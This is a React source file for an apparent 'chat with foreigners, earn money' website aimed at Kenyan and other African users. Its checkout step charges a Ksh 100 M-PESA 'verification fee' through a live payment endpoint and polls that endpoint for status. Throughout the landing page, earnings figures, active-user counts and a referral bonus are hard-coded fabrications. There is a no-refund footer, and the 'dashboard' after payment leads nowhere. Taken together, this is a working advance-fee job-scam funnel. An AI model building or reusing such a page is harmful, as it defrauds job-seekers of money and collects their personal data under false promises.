import { useState } from "react";

const STEPS = { LANDING: "landing", REGISTER: "register", PAYMENT: "payment", SUCCESS: "success" };
const countries = ["Kenya", "Uganda", "Tanzania", "Rwanda", "Ethiopia", "Nigeria", "Ghana", "South Africa"];

function Spinner() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" style={{animation:"spin 0.8s linear infinite"}}>
      <circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="2.5" opacity="0.2"/>
      <path d="M12 2a10 10 0 0 1 10 10" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round"/>
    </svg>
  );
}

function InputField({ label, type="text", placeholder, value, onChange, prefix, hint, error }) {
  const [focused, setFocused] = useState(false);
  return (
    <div style={{marginBottom:"1rem"}}>
      <div style={{display:"flex", justifyContent:"space-between", alignItems:"center", marginBottom:"7px"}}>
        <label style={{fontSize:"11px", fontWeight:"600", letterSpacing:"0.08em", textTransform:"uppercase", color:error?"#ff6b6b":"rgba(255,255,255,0.4)"}}>{label}</label>
        {hint && <span style={{fontSize:"10px", color:"rgba(255,255,255,0.25)", background:"rgba(255,255,255,0.06)", padding:"2px 8px", borderRadius:"20px", border:"1px solid rgba(255,255,255,0.08)"}}>{hint}</span>}
      </div>
      <div style={{display:"flex", alignItems:"center", border:`1px solid ${error?"rgba(255,107,107,0.6)":focused?"rgba(255,255,255,0.25)":"rgba(255,255,255,0.08)"}`, borderRadius:"12px", background:focused?"rgba(255,255,255,0.07)":"rgba(255,255,255,0.04)", transition:"all 0.2s", overflow:"hidden"}}>
        {prefix && <span style={{padding:"0 14px", color:"rgba(255,255,255,0.25)", fontSize:"14px", borderRight:"1px solid rgba(255,255,255,0.08)", height:"48px", display:"flex", alignItems:"center", fontWeight:"500"}}>{prefix}</span>}
        <input type={type} placeholder={placeholder} value={value} onChange={e => onChange(e.target.value)} onFocus={() => setFocused(true)} onBlur={() => setFocused(false)}
          style={{flex:1, border:"none", outline:"none", padding:"0 16px", height:"48px", fontSize:"14px", background:"transparent", color:"#fff", fontFamily:"inherit"}}/>
      </div>
      {error && <p style={{fontSize:"11px", color:"#ff6b6b", marginTop:"5px"}}>⚠ {error}</p>}
    </div>
  );
}

function SelectField({ label, value, onChange, options }) {
  const [focused, setFocused] = useState(false);
  return (
    <div style={{marginBottom:"1rem"}}>
      <label style={{display:"block", fontSize:"11px", fontWeight:"600", letterSpacing:"0.08em", textTransform:"uppercase", color:"rgba(255,255,255,0.4)", marginBottom:"7px"}}>{label}</label>
      <div style={{border:`1px solid ${focused?"rgba(255,255,255,0.25)":"rgba(255,255,255,0.08)"}`, borderRadius:"12px", background:focused?"rgba(255,255,255,0.07)":"rgba(255,255,255,0.04)", transition:"all 0.2s", overflow:"hidden"}}>
        <select value={value} onChange={e => onChange(e.target.value)} onFocus={() => setFocused(true)} onBlur={() => setFocused(false)}
          style={{width:"100%", border:"none", outline:"none", padding:"0 16px", height:"48px", fontSize:"14px", background:"transparent", color:"#fff", fontFamily:"inherit", cursor:"pointer", appearance:"none"}}>
          {options.map(o => <option key={o} value={o} style={{background:"#1a1a2e", color:"#fff"}}>{o}</option>)}
        </select>
      </div>
    </div>
  );
}

// ─── LANDING PAGE ─────────────────────────────────────────────────────────────
function LandingStep({ onSignUp }) {
  const stats = [
    { value: "$15,420+", label: "PAID OUT TODAY" },
    { value: "$0.45",    label: "AVG. PAYOUT / MESSAGE" },
    { value: "2 Min",    label: "INSTANT ACTIVATION" },
  ];
  const features = [
    { icon: "🤝", iconBg: "#1d9e75", title: "High Earning Rates",    desc: "Earn up to Ksh 60 ($0.45) per chat message. The more engaging your conversations, the more you earn daily." },
    { icon: "⚡", iconBg: "#f5a623", title: "Instant Payouts",       desc: "Withdraw earnings directly to M-PESA, PayPal, or Binance Pay. Payouts processed instantly with zero delays." },
    { icon: "🔒", iconBg: "#f5a623", title: "100% Safe & Secure",    desc: "Our Digital Marketing Hub complies with safety protocols. Chat within our secure portal with verified profiles." },
  ];

  return (
    <div style={{minHeight:"100vh", display:"flex", flexDirection:"column"}}>
      {/* NAV */}
      <nav className="landing-nav">
        <div style={{display:"flex", alignItems:"center", gap:"10px", minWidth:0}}>
          <div style={{flexShrink:0, width:"36px", height:"36px", borderRadius:"10px", background:"linear-gradient(135deg,#1d9e75,#0a4d38)", display:"flex", alignItems:"center", justifyContent:"center", fontSize:"18px", boxShadow:"0 4px 12px rgba(29,158,117,0.3)"}}>💬</div>
          <span className="nav-brand">Chat Na Wazungu</span>
        </div>
        <button onClick={onSignUp} className="btn-primary" style={{flexShrink:0, padding:"10px 20px", fontSize:"13px", borderRadius:"10px"}}>
          Sign Up
        </button>
      </nav>

      {/* HERO */}
      <div className="hero-section" style={{animation:"slideUp 0.5s ease"}}>
        {/* Live badge */}
        <div style={{display:"inline-flex", alignItems:"center", gap:"8px", background:"rgba(29,158,117,0.12)", border:"1px solid rgba(29,158,117,0.25)", borderRadius:"20px", padding:"6px 16px 6px 10px", marginBottom:"1.8rem"}}>
          <span style={{width:"7px", height:"7px", borderRadius:"50%", background:"#1d9e75", display:"inline-block", boxShadow:"0 0 8px #1d9e75", flexShrink:0}}/>
          <span style={{fontSize:"12px", color:"#4cd9a0", fontWeight:"600", letterSpacing:"0.03em"}}>4,821 Wazungus Active Online Now</span>
        </div>

        <h1 className="hero-h1">
          Chat with Foreigners.<br/>
          <span style={{background:"linear-gradient(135deg,#1d9e75,#4cd9a0)", WebkitBackgroundClip:"text", WebkitTextFillColor:"transparent"}}>Earn Passive Income.</span>
        </h1>

        <p className="hero-sub">
          Join the premium Digital Marketing and Chatting Hub. Connect with lonely people worldwide, build friendships, and get paid instantly to your M-PESA.
        </p>

        <button onClick={onSignUp} className="btn-primary hero-cta">
          Start Earning Now 🚀
        </button>

        {/* STATS */}
        <div className="stats-grid">
          {stats.map(s => (
            <div key={s.label} className="stat-card">
              <p className="stat-value">{s.value}</p>
              <p className="stat-label">{s.label}</p>
            </div>
          ))}
        </div>
      </div>

      {/* WHY SECTION */}
      <div className="why-section">
        <h2 className="why-title">Why Chat Na Wazungu?</h2>
        <div className="features-grid">
          {features.map(f => (
            <div key={f.title} className="feature-card">
              <div style={{width:"46px", height:"46px", borderRadius:"12px", background:`${f.iconBg}22`, border:`1px solid ${f.iconBg}44`, display:"flex", alignItems:"center", justifyContent:"center", fontSize:"22px", marginBottom:"1.2rem"}}>
                {f.icon}
              </div>
              <h3 style={{fontSize:"15px", fontWeight:"700", color:"#fff", margin:"0 0 8px"}}>{f.title}</h3>
              <p style={{fontSize:"13px", color:"rgba(255,255,255,0.35)", lineHeight:1.7, margin:0}}>{f.desc}</p>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

// ─── REGISTER ─────────────────────────────────────────────────────────────────
function RegisterStep({ onNext }) {
  const [form, setForm] = useState({ username:"", email:"", phone:"", country:"Kenya", password:"" });
  const [errors, setErrors] = useState({});
  const [loading, setLoading] = useState(false);
  const set = k => v => setForm(f => ({...f, [k]: v}));

  const validate = () => {
    const e = {};
    if (!form.username.trim()) e.username = "Username is required";
    if (!form.email.includes("@")) e.email = "Enter a valid email";
    if (!form.phone.match(/^0[17]\d{8}$/)) e.phone = "Enter a valid phone (07/01XXXXXXXX)";
    if (form.password.length < 6) e.password = "At least 6 characters";
    return e;
  };

  const handleSubmit = async () => {
    const e = validate();
    if (Object.keys(e).length) { setErrors(e); return; }
    setErrors({});
    setLoading(true);
    await new Promise(r => setTimeout(r, 900));
    setLoading(false);
    onNext(form);
  };

  return (
    <div>
      <div style={{marginBottom:"1.8rem"}}>
        <div style={{display:"inline-flex", alignItems:"center", gap:"6px", background:"rgba(29,158,117,0.15)", border:"1px solid rgba(29,158,117,0.3)", borderRadius:"20px", padding:"5px 12px 5px 8px", marginBottom:"1.2rem"}}>
          <span style={{width:"6px", height:"6px", borderRadius:"50%", background:"#1d9e75", display:"inline-block", boxShadow:"0 0 6px #1d9e75"}}/>
          <span style={{fontSize:"12px", color:"#4cd9a0", fontWeight:"600"}}>Invited by Mzunye</span>
          <span style={{fontSize:"10px", background:"linear-gradient(135deg,#ff6b35,#f7c59f)", color:"#fff", borderRadius:"10px", padding:"2px 8px", fontWeight:"700", marginLeft:"2px", letterSpacing:"0.05em"}}>BONUS</span>
        </div>
        <h1 style={{fontSize:"26px", fontWeight:"800", color:"#fff", margin:"0 0 6px", letterSpacing:"-0.8px", lineHeight:"1.2"}}>Create your<br/>account</h1>
        <p style={{fontSize:"13px", color:"rgba(255,255,255,0.35)", margin:0}}>Join thousands earning daily</p>
      </div>
      <InputField label="Username" placeholder="Your display name" value={form.username} onChange={set("username")} prefix="@" error={errors.username}/>
      <InputField label="Email" type="email" placeholder="you@email.com" value={form.email} onChange={set("email")} error={errors.email}/>
      <InputField label="Phone" placeholder="07XXXXXXXX" value={form.phone} onChange={set("phone")} hint="M-PESA" error={errors.phone}/>
      <SelectField label="Country" value={form.country} onChange={set("country")} options={countries}/>
      <InputField label="Password" type="password" placeholder="Min. 6 characters" value={form.password} onChange={set("password")} error={errors.password}/>
      <div style={{marginTop:"0.5rem"}}>
        <button onClick={handleSubmit} disabled={loading} style={{width:"100%", height:"52px", background:loading?"rgba(255,255,255,0.1)":"linear-gradient(135deg,#1d9e75,#0f6e56)", color:"#fff", border:"none", borderRadius:"12px", fontSize:"14px", fontWeight:"700", cursor:loading?"not-allowed":"pointer", display:"flex", alignItems:"center", justifyContent:"center", gap:"8px", transition:"all 0.2s", letterSpacing:"0.04em", fontFamily:"inherit", boxShadow:loading?"none":"0 4px 20px rgba(29,158,117,0.35)"}}>
          {loading ? <><Spinner/> Setting up…</> : "Create Account →"}
        </button>
      </div>
      <p style={{textAlign:"center", fontSize:"12px", color:"rgba(255,255,255,0.2)", marginTop:"1.2rem"}}>
        Already have an account?{" "}
        <span style={{color:"rgba(255,255,255,0.6)", fontWeight:"600", cursor:"pointer"}}>Sign in</span>
      </p>
    </div>
  );
}

// ─── PAYMENT ──────────────────────────────────────────────────────────────────
function PaymentStep({ userData, onSuccess }) {
  const [phone, setPhone] = useState(userData?.phone || "");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [statusMsg, setStatusMsg] = useState("");

  const handlePay = async () => {
    if (!phone.match(/^(07|01|254|\+254)\d{8,9}$/)) { setError("Enter a valid M-PESA number"); return; }
    setError("");
    setLoading(true);
    setStatusMsg("Sending payment prompt…");
    try {
      const res = await fetch("https://fulz-1.onrender.com/api/boosts/pay", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ phone, amount: 100, fee: 100, identificationNumber: userData?.email || userData?.username, customer_name: userData?.username || "Customer" })
      });
      const data = await res.json();
      if (!res.ok || !data.success) throw new Error(data.error || "Payment failed");
      const boostId = data.boostId;
      setStatusMsg("Check your phone and enter M-PESA PIN…");
      let attempts = 0;
      const poll = setInterval(async () => {
        attempts++;
        try {
          const check = await fetch("https://fulz-1.onrender.com/api/boosts/" + boostId);
          const boost = await check.json();
          if (boost.paid === true || boost.paymentStatus === "COMPLETED") {
            clearInterval(poll); setLoading(false); onSuccess();
          } else if (boost.paymentStatus === "FAILED" || boost.paymentStatus === "CANCELLED") {
            clearInterval(poll); setLoading(false); setStatusMsg(""); setError("Payment " + boost.paymentStatus.toLowerCase() + ". Please try again.");
          } else if (attempts >= 24) {
            clearInterval(poll); setLoading(false); setStatusMsg(""); setError("Payment timed out. If you paid, contact support.");
          }
        } catch { clearInterval(poll); setLoading(false); setStatusMsg(""); setError("Could not verify payment. Contact support."); }
      }, 5000);
    } catch (err) { setError(err.message || "Payment failed. Please try again."); setLoading(false); setStatusMsg(""); }
  };

  return (
    <div>
      <div style={{marginBottom:"1.8rem"}}>
        <div style={{borderRadius:"16px", padding:"1.4rem", marginBottom:"1.5rem", background:"rgba(29,158,117,0.1)", border:"1px solid rgba(29,158,117,0.2)", position:"relative", overflow:"hidden"}}>
          <div style={{position:"absolute", top:"-20px", right:"-20px", width:"80px", height:"80px", borderRadius:"50%", background:"rgba(29,158,117,0.15)"}}/>
          <p style={{fontSize:"10px", fontWeight:"700", letterSpacing:"0.1em", textTransform:"uppercase", color:"rgba(76,217,160,0.6)", margin:"0 0 8px"}}>Verification Fee</p>
          <p style={{fontSize:"36px", fontWeight:"900", color:"#fff", margin:"0 0 4px", letterSpacing:"-1.5px"}}>Ksh 100</p>
          <p style={{fontSize:"12px", color:"rgba(255,255,255,0.3)", margin:0}}>One-time · Instant activation</p>
        </div>
        <h2 style={{fontSize:"22px", fontWeight:"800", color:"#fff", margin:"0 0 5px", letterSpacing:"-0.5px"}}>Activate account</h2>
        <p style={{fontSize:"13px", color:"rgba(255,255,255,0.35)", margin:0}}>Enter your M-PESA number below</p>
      </div>
      <div style={{marginBottom:"1rem"}}>
        <label style={{display:"block", fontSize:"11px", fontWeight:"600", letterSpacing:"0.08em", textTransform:"uppercase", color:error?"#ff6b6b":"rgba(255,255,255,0.4)", marginBottom:"7px"}}>M-PESA Number</label>
        <div style={{display:"flex", alignItems:"center", border:`1px solid ${error?"rgba(255,107,107,0.6)":"rgba(255,255,255,0.08)"}`, borderRadius:"12px", background:"rgba(255,255,255,0.04)", overflow:"hidden"}}>
          <span style={{padding:"0 14px", fontSize:"20px", borderRight:"1px solid rgba(255,255,255,0.08)", height:"52px", display:"flex", alignItems:"center"}}>📱</span>
          <input type="tel" placeholder="07XX or +254XX" value={phone} onChange={e => { setPhone(e.target.value); setError(""); }}
            style={{flex:1, border:"none", outline:"none", padding:"0 16px", height:"52px", fontSize:"15px", background:"transparent", color:"#fff", fontFamily:"inherit"}}/>
        </div>
        {error && <p style={{fontSize:"11px", color:"#ff6b6b", marginTop:"5px"}}>⚠ {error}</p>}
        <p style={{fontSize:"11px", color:"rgba(255,255,255,0.2)", marginTop:"6px"}}>Accepts: 07XX · 01XX · 254XX · +254XX</p>
      </div>
      {loading && statusMsg && (
        <div style={{background:"rgba(29,158,117,0.1)", border:"1px solid rgba(29,158,117,0.2)", borderRadius:"10px", padding:"10px 14px", marginBottom:"1rem", display:"flex", alignItems:"center", gap:"10px"}}>
          <Spinner/><p style={{fontSize:"12px", color:"#4cd9a0", margin:0}}>{statusMsg}</p>
        </div>
      )}
      {!loading && (
        <div style={{background:"rgba(255,255,255,0.04)", border:"1px solid rgba(255,255,255,0.08)", borderRadius:"10px", padding:"10px 14px", marginBottom:"1.2rem", display:"flex", alignItems:"center", gap:"8px"}}>
          <span style={{fontSize:"14px"}}>🔒</span>
          <p style={{fontSize:"12px", color:"rgba(255,255,255,0.3)", margin:0}}>Review details before M-PESA prompt is sent</p>
        </div>
      )}
      <button onClick={handlePay} disabled={loading} style={{width:"100%", height:"52px", background:loading?"rgba(255,255,255,0.06)":"linear-gradient(135deg,#1d9e75,#0f6e56)", color:"#fff", border:loading?"1px solid rgba(255,255,255,0.1)":"none", borderRadius:"12px", fontSize:"15px", fontWeight:"700", cursor:loading?"not-allowed":"pointer", display:"flex", alignItems:"center", justifyContent:"center", gap:"8px", transition:"all 0.2s", letterSpacing:"0.04em", fontFamily:"inherit", boxShadow:loading?"none":"0 4px 20px rgba(29,158,117,0.35)"}}>
        {loading ? <><Spinner/> Waiting for payment…</> : "Pay Ksh 100 →"}
      </button>
      {loading && (
        <button onClick={() => { setLoading(false); setStatusMsg(""); setError("Payment cancelled."); }}
          style={{width:"100%", marginTop:"10px", height:"38px", background:"transparent", border:"none", fontSize:"12px", color:"rgba(255,255,255,0.2)", cursor:"pointer", fontFamily:"inherit"}}>
          Cancel
        </button>
      )}
    </div>
  );
}

// ─── SUCCESS ──────────────────────────────────────────────────────────────────
function SuccessStep() {
  return (
    <div style={{textAlign:"center", padding:"1.5rem 0"}}>
      <div style={{position:"relative", display:"inline-block", marginBottom:"1.5rem"}}>
        <div style={{width:"72px", height:"72px", borderRadius:"50%", background:"rgba(29,158,117,0.15)", border:"1px solid rgba(29,158,117,0.3)", display:"flex", alignItems:"center", justifyContent:"center", color:"#4cd9a0", margin:"0 auto"}}>
          <svg width="32" height="32" viewBox="0 0 20 20" fill="none">
            <path d="M4 10l4.5 4.5L16 7" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
          </svg>
        </div>
        <div style={{position:"absolute", top:"-4px", right:"-4px", width:"20px", height:"20px", borderRadius:"50%", background:"#1d9e75", display:"flex", alignItems:"center", justifyContent:"center", fontSize:"11px", color:"#fff"}}>✓</div>
      </div>
      <h2 style={{fontSize:"26px", fontWeight:"800", color:"#fff", margin:"0 0 10px", letterSpacing:"-0.8px"}}>You're all set! 🎉</h2>
      <p style={{fontSize:"14px", color:"rgba(255,255,255,0.35)", margin:"0 0 2rem", lineHeight:"1.7"}}>Account activated. Welcome to<br/>Chat Na Wazungu — start earning today.</p>
      <button style={{background:"linear-gradient(135deg,#1d9e75,#0f6e56)", color:"#fff", border:"none", borderRadius:"12px", padding:"15px 36px", fontSize:"14px", fontWeight:"700", cursor:"pointer", letterSpacing:"0.04em", fontFamily:"inherit", boxShadow:"0 4px 20px rgba(29,158,117,0.4)"}}>
        Go to Dashboard →
      </button>
    </div>
  );
}

// ─── ROOT ──────────────────────────────────────────────────────────────────────
export default function ChatNaWazungu() {
  const [step, setStep] = useState(STEPS.LANDING);
  const [userData, setUserData] = useState(null);
  const formSteps = [STEPS.REGISTER, STEPS.PAYMENT];
  const currentIdx = formSteps.indexOf(step);
  const isFormStep = [STEPS.REGISTER, STEPS.PAYMENT, STEPS.SUCCESS].includes(step);

  return (
    <>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800;900&display=swap');
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #0d0d1a; min-height: 100vh; }
        input::placeholder { color: rgba(255,255,255,0.18); }

        @keyframes spin     { to { transform: rotate(360deg); } }
        @keyframes slideUp  { from { opacity:0; transform:translateY(20px); } to { opacity:1; transform:translateY(0); } }
        @keyframes blob1    { 0%,100%{transform:translate(0,0) scale(1);} 33%{transform:translate(30px,-20px) scale(1.05);} 66%{transform:translate(-20px,15px) scale(0.97);} }
        @keyframes blob2    { 0%,100%{transform:translate(0,0) scale(1);} 33%{transform:translate(-25px,20px) scale(1.04);} 66%{transform:translate(20px,-15px) scale(0.98);} }

        button:hover:not(:disabled) { filter: brightness(1.12); }
        .feature-card:hover { transform: translateY(-4px) !important; border-color: rgba(29,158,117,0.3) !important; }

        /* ── shared button ── */
        .btn-primary {
          background: linear-gradient(135deg,#1d9e75,#0f6e56);
          color: #fff; border: none; font-weight: 700;
          cursor: pointer; font-family: inherit; letter-spacing: 0.04em;
          box-shadow: 0 4px 20px rgba(29,158,117,0.35);
          transition: all 0.2s;
        }

        /* ── NAV ── */
        .landing-nav {
          display: flex; align-items: center; justify-content: space-between;
          padding: 1rem 2rem;
          border-bottom: 1px solid rgba(255,255,255,0.06);
          backdrop-filter: blur(12px);
          position: sticky; top: 0; z-index: 10;
          background: rgba(13,13,26,0.85);
        }
        .nav-brand {
          font-size: 16px; font-weight: 800; color: #fff; letter-spacing: -0.4px;
          white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
        }

        /* ── HERO ── */
        .hero-section {
          flex: 1; display: flex; flex-direction: column;
          align-items: center; justify-content: center;
          text-align: center; padding: 4rem 1.5rem 3rem;
        }
        .hero-h1 {
          font-size: clamp(32px, 6vw, 68px);
          font-weight: 900; color: #fff;
          margin: 0 0 0.4rem; letter-spacing: -2px;
          line-height: 1.1; max-width: 700px;
        }
        .hero-sub {
          font-size: clamp(14px, 2.2vw, 16px);
          color: rgba(255,255,255,0.45);
          margin: 1.4rem 0 2.4rem;
          max-width: 520px; line-height: 1.7;
        }
        .hero-cta {
          border-radius: 14px; padding: 16px 40px;
          font-size: 15px; font-weight: 800;
          display: inline-flex; align-items: center; gap: 8px;
          box-shadow: 0 8px 32px rgba(29,158,117,0.45);
        }

        /* ── STATS ── */
        .stats-grid {
          display: grid;
          grid-template-columns: repeat(3, 1fr);
          gap: 1rem; margin-top: 3rem; width: 100%; max-width: 560px;
        }
        .stat-card {
          background: rgba(255,255,255,0.04);
          border: 1px solid rgba(255,255,255,0.08);
          border-radius: 16px; padding: 1.2rem 1rem;
          backdrop-filter: blur(8px); text-align: center;
        }
        .stat-value {
          font-size: clamp(20px, 4vw, 30px);
          font-weight: 900; color: #4cd9a0;
          margin: 0 0 5px; letter-spacing: -1px;
        }
        .stat-label {
          font-size: 9px; font-weight: 700;
          letter-spacing: 0.1em; color: rgba(255,255,255,0.3);
          margin: 0; text-transform: uppercase;
        }

        /* ── WHY SECTION ── */
        .why-section { padding: 3rem 1.5rem 5rem; text-align: center; }
        .why-title {
          font-size: clamp(22px, 4vw, 32px);
          font-weight: 800; color: #fff;
          margin: 0 0 2.5rem; letter-spacing: -0.8px;
        }
        .features-grid {
          display: grid;
          grid-template-columns: repeat(3, 1fr);
          gap: 1.2rem; max-width: 900px; margin: 0 auto;
        }
        .feature-card {
          background: rgba(255,255,255,0.04);
          border: 1px solid rgba(255,255,255,0.08);
          border-radius: 20px; padding: 1.8rem 1.5rem;
          text-align: left; transition: transform 0.2s, border-color 0.2s;
        }

        /* ── TABLET (≤ 700px): stats 2-col, features 1-col ── */
        @media (max-width: 700px) {
          .landing-nav { padding: 0.9rem 1.2rem; }
          .nav-brand { font-size: 14px; }
          .hero-section { padding: 3rem 1.2rem 2rem; }
          .hero-h1 { letter-spacing: -1.5px; }
          .stats-grid { grid-template-columns: repeat(3, 1fr); gap: 0.7rem; }
          .features-grid { grid-template-columns: 1fr; max-width: 480px; }
          .why-section { padding: 2.5rem 1.2rem 4rem; }
        }

        /* ── MOBILE (≤ 480px): everything single-column ── */
        @media (max-width: 480px) {
          .landing-nav { padding: 0.85rem 1rem; }
          .nav-brand { font-size: 13px; }
          .hero-section { padding: 2.5rem 1rem 2rem; }
          .hero-cta { width: 100%; justify-content: center; padding: 15px 24px; }
          .stats-grid {
            grid-template-columns: 1fr;
            gap: 0.7rem; max-width: 340px;
          }
          .stat-card { padding: 1rem 1.2rem; display: flex; align-items: center; justify-content: space-between; gap: 1rem; }
          .stat-value { font-size: 24px; margin: 0; }
          .stat-label { font-size: 9px; text-align: right; }
          .features-grid { grid-template-columns: 1fr; }
          .why-section { padding: 2rem 1rem 3.5rem; }
          .feature-card { padding: 1.4rem 1.2rem; }
        }
      `}</style>

      {/* Ambient blobs */}
      <div style={{position:"fixed", inset:0, overflow:"hidden", pointerEvents:"none", zIndex:0}}>
        <div style={{position:"absolute", top:"-10%", left:"-5%", width:"500px", height:"500px", borderRadius:"50%", background:"radial-gradient(circle,rgba(29,158,117,0.12),transparent 70%)", animation:"blob1 12s ease-in-out infinite"}}/>
        <div style={{position:"absolute", bottom:"-10%", right:"-5%", width:"450px", height:"450px", borderRadius:"50%", background:"radial-gradient(circle,rgba(15,110,86,0.1),transparent 70%)", animation:"blob2 15s ease-in-out infinite"}}/>
      </div>

      <div style={{position:"relative", zIndex:1, minHeight:"100vh"}}>
        {/* LANDING — full width */}
        {step === STEPS.LANDING && (
          <LandingStep onSignUp={() => setStep(STEPS.REGISTER)} />
        )}

        {/* FORM STEPS — centred card */}
        {isFormStep && step !== STEPS.LANDING && (
          <div style={{minHeight:"100vh", display:"flex", alignItems:"center", justifyContent:"center", padding:"2rem 1rem"}}>
            <div style={{width:"100%", maxWidth:"400px", animation:"slideUp 0.4s ease"}}>
              <div style={{textAlign:"center", marginBottom:"1.8rem"}}>
                <div style={{width:"52px", height:"52px", borderRadius:"16px", background:"linear-gradient(135deg,#1d9e75,#0a4d38)", display:"flex", alignItems:"center", justifyContent:"center", margin:"0 auto 12px", fontSize:"24px", boxShadow:"0 8px 24px rgba(29,158,117,0.3)"}}>💬</div>
                <p style={{fontSize:"12px", fontWeight:"700", letterSpacing:"0.14em", textTransform:"uppercase", color:"rgba(255,255,255,0.3)"}}>Chat Na Wazungu</p>
              </div>
              {step !== STEPS.SUCCESS && (
                <div style={{display:"flex", gap:"6px", marginBottom:"1.5rem"}}>
                  {formSteps.map((s, i) => (
                    <div key={s} style={{flex:1, height:"2px", borderRadius:"99px", background:i<=currentIdx?"#1d9e75":"rgba(255,255,255,0.08)", transition:"background 0.4s", boxShadow:i<=currentIdx?"0 0 8px rgba(29,158,117,0.5)":"none"}}/>
                  ))}
                </div>
              )}
              <div style={{background:"rgba(255,255,255,0.04)", backdropFilter:"blur(20px)", WebkitBackdropFilter:"blur(20px)", borderRadius:"24px", padding:"2rem", border:"1px solid rgba(255,255,255,0.08)", boxShadow:"0 24px 60px rgba(0,0,0,0.4), inset 0 1px 0 rgba(255,255,255,0.06)"}}>
                {step === STEPS.REGISTER && <RegisterStep onNext={d => { setUserData(d); setStep(STEPS.PAYMENT); }}/>}
                {step === STEPS.PAYMENT  && <PaymentStep userData={userData} onSuccess={() => setStep(STEPS.SUCCESS)}/>}
                {step === STEPS.SUCCESS  && <SuccessStep/>}
              </div>
              <p style={{textAlign:"center", fontSize:"11px", color:"rgba(255,255,255,0.1)", marginTop:"1.2rem"}}>© 2026 Chat Na Wazungu · No-Refund Policy</p>
            </div>
          </div>
        )}
      </div>
    </>
  );
}